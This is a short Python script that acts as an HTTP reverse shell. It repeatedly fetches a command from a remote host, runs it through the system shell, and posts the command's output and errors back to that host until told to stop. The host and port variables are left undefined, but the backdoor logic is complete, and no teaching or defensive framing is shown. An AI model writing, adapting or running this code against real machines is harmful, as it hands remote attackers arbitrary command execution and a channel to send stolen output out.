import requests
import time
import subprocess

while True:
    req = requests.get(host+":"+port)
    command = req.text

    if 'terminate' in command:
        break
    else:
        cmd = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url=host+":"+port, data=cmd.stdout.read())
        post_response = requests.post(url=host+":"+port, data=cmd.stderr.read())

    time.sleep(3)